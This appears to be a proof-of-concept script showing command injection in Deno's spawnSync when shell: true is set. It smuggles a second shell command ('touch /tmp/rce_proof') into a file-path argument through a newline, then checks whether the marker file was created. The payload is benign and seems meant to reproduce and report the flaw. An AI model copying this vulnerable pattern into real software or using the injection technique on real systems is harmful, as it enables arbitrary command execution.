import { spawnSync } from "node:child_process";
import * as fs from "node:fs";

// Cleanup
try {
  fs.unlinkSync("/tmp/rce_proof");
} catch {}

// Create legitimate script
fs.writeFileSync("/tmp/legitimate.ts", 'console.log("normal");');

// Malicious input with newline injection
const maliciousInput = `/tmp/legitimate.ts\ntouch /tmp/rce_proof`;

// Vulnerable pattern
spawnSync(Deno.execPath(), ["run", "--allow-all", maliciousInput], {
  shell: true,
  encoding: "utf-8",
});

// Verify
console.log("Exploit worked:", fs.existsSync("/tmp/rce_proof"));
